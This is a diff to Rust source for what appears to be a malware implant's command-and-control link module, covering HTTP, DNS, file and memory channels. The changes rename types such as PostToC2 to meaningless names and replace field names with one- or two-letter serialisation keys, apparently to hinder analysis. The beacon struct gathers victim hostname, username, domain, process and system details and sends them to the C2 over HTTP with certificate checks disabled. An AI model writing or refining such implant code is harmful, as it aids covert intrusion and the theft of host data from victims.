@@ -33,15 +33,15 @@ use log::info;
 #[derive(Serialize, Deserialize, PartialEq, Clone)]
 pub enum Lk {
     #[serde(rename = "hh")]
-    HTTP(HTTPLink),
+    HTTP(HHH),
     #[serde(rename = "dd")]
-    DNS(DNSLink),
+    DNS(DDD),
     #[serde(rename = "ff")]
-    FILE(FileLink),
+    FILE(FFF),
     #[serde(rename = "me")]
-    MEMORY(MemoryLink),
+    MEMORY(MMM),
     #[serde(rename = "hhp")]
-    HTTPP(HTTPP),
+    HTTPP(HHHP),
 }
 impl Lk {
     pub fn print_link_compact(&self) {
@@ -111,42 +111,63 @@ impl Lk {
 }
 
 #[derive(Serialize, Deserialize, PartialEq, Clone)]
-pub struct HTTPLink {
+pub struct HHH {
+    #[serde(rename = "u")]
     pub url: String,
+    #[serde(rename = "do")]
     pub dataoperation: Vec<DO>,
+    #[serde(rename = "s")]
     pub sleep: u64,
+    #[serde(rename = "j")]
     pub jitt: u64,
 }
 #[derive(Serialize, Deserialize, PartialEq, Clone)]
-pub struct DNSLink {
+pub struct DDD {
+    #[serde(rename = "d")]
     pub dns: String,
+    #[serde(rename = "do")]
     pub dataoperation: Vec<DO>,
+    #[serde(rename = "s")]
     pub sleep: u64,
+    #[serde(rename = "j")]
     pub jitt: u64,
 }
 
 #[derive(Serialize, Deserialize, PartialEq, Clone)]
-pub struct FileLink {
+pub struct FFF {
+    #[serde(rename = "f")]
     pub file_path: String,
+    #[serde(rename = "do")]
     pub dataoperation: Vec<DO>,
+    #[serde(rename = "s")]
     pub sleep: u64,
+    #[serde(rename = "j")]
     pub jitt: u64,
 }
 
 #[derive(Serialize, Deserialize, PartialEq, Clone)]
-pub struct MemoryLink {
+pub struct MMM {
+    #[serde(rename = "mnb")]
     pub memory_nb: i32,
+    #[serde(rename = "do")]
     pub dataoperation: Vec<DO>,
+    #[serde(rename = "s")]
     pub sleep: u64,
+    #[serde(rename = "j")]
     pub jitt: u64,
 }
 
 #[derive(Serialize, Deserialize, PartialEq, Clone)]
-pub struct HTTPP {
+pub struct HHHP {
+    #[serde(rename = "u")]
     pub url: String,
+    #[serde(rename = "do")]
     pub dataoperation: Vec<DO>,
+    #[serde(rename = "")]
     pub dataoperation_post: Vec<DO>,
+    #[serde(rename = "s")]
     pub sleep: u64,
+    #[serde(rename = "j")]
     pub jitt: u64,
 }
 
@@ -272,7 +293,7 @@ impl LinkFetch for Lk {
     }
 }
 
-impl LinkFetch for FileLink {
+impl LinkFetch for FFF {
     fn download_data(&self, _config: &CCC) -> Result<Vec<u8>, anyhow::Error> {
         read_file(&self.get_target())
     }
@@ -300,7 +321,7 @@ impl LinkFetch for FileLink {
     }
 }
 
-impl LinkFetch for MemoryLink {
+impl LinkFetch for MMM {
     fn download_data(&self, _config: &CCC) -> Result<Vec<u8>, anyhow::Error> {
         access_memory(self.memory_nb)
     }
@@ -328,7 +349,7 @@ impl LinkFetch for MemoryLink {
     }
 }
 
-impl LinkFetch for DNSLink {
+impl LinkFetch for DDD {
     fn download_data(&self, _config: &CCC) -> Result<Vec<u8>, anyhow::Error> {
         todo!()
     }
@@ -356,7 +377,7 @@ impl LinkFetch for DNSLink {
     }
 }
 
-impl LinkFetch for HTTPLink {
+impl LinkFetch for HHH {
     fn download_data(&self, config: &CCC) -> Result<Vec<u8>, anyhow::Error> {
         let build: attohttpc::RequestBuilder = attohttpc::get(&self.get_target())
             .danger_accept_invalid_certs(true)
@@ -391,46 +412,65 @@ impl LinkFetch for HTTPLink {
     }
 }
 
-#[derive(Serialize, Deserialize, PartialEq, Clone)]
-pub struct LightPayload {
-    pub todo: String,
-}
 
 #[derive(Serialize, Deserialize, PartialEq, Clone)]
-pub struct PostToC2 {
+pub struct HHCC {
+    #[serde(rename = "a")]
     pub session_id: String,
+    #[serde(rename = "b")]
     pub hostname: String,
+    #[serde(rename = "c")]
     pub username: String,
+    #[serde(rename = "d")]
     pub domain: String,
+    #[serde(rename = "e")]
     pub arch: String,
+    #[serde(rename = "f")]
     pub distro: String,
+    #[serde(rename = "g")]
     pub desktop_env: String,
-
+    #[serde(rename = "h")]
     pub cmdline: String,
+    #[serde(rename = "i")]
     pub working_dir: String,
+    #[serde(rename = "j")]
     pub process_path: String,
+    #[serde(rename = "k")]
     pub process_name: String,
+    #[serde(rename = "l")]
     pub pid: u32,
+    #[serde(rename = "m")]
     pub parent_name: String,
+    #[serde(rename = "gh")]
     pub ppid: u32,
-
+    #[serde(rename = "t")]
     pub total_memory: String,
+    #[serde(rename = "u")]
     pub used_memory: String,
+    #[serde(rename = "v")]
     pub nb_cpu: usize,
-
+    #[serde(rename = "w")]
     pub data_operation: Vec<DO>,
     //pub running_thread: Vec<String>,
+    #[serde(rename = "x")]
     pub running_thread_payload: Vec<String>,
+    #[serde(rename = "y")]
     pub runonce_payload: Vec<String>,
+    #[serde(rename = "z")]
     pub running_thread_decoy_update: Vec<String>,
+    #[serde(rename = "du")]
     pub runonce_decoy_update: Vec<String>,
+    #[serde(rename = "da")]
     pub running_thread_decoy_payload: Vec<String>,
+    #[serde(rename = "dl")]
     pub runonce_decoy_payload: Vec<String>,
+    #[serde(rename = "pb")]
     pub peer_public_key_bytes : Vec<u8>,
+    #[serde(rename = "sb")]
     pub sign_bytes: Vec<u8>,
 }
 
-impl LinkFetch for HTTPP {
+impl LinkFetch for HHHP {
     fn download_data(&self, _config: &CCC) -> Result<Vec<u8>, anyhow::Error> {
         todo!()
     }
@@ -481,7 +521,7 @@ impl LinkFetch for HTTPP {
         let (process_name, parent_name, ppid) = process_name_and_parent(&sys);
         let process_path = process_path();
 
-        let mut post_data: PostToC2 = PostToC2 {
+        let mut post_data: HHCC = HHCC {
             session_id: session_id.to_string(),
             hostname: whoami::devicename(),
             username: whoami::username(),
@@ -521,20 +561,6 @@ impl LinkFetch for HTTPP {
         let post_data_bytes = serde_json::to_vec(&post_data)?;
         let m: Vec<u8> =
             apply_all_dataoperations(&mut self.dataoperation_post.clone(), post_data_bytes)?;
-
-        /*
-        let client = reqwest::blocking::Client::builder()
-            .danger_accept_invalid_certs(true)
-            .timeout(Duration::from_secs(config.link_timeout))
-            .user_agent(&config.link_user_agent)
-            .build()?;
-
-        let mut res = client.post(&self.get_target()).body(m).send()?;
-        let mut body: Vec<u8> = Vec::new();
-        res.read_to_end(&mut body)?;
-
-        Ok(body)
-        */
 
         let build = attohttpc::post(&self.get_target())
             .danger_accept_invalid_certs(true)
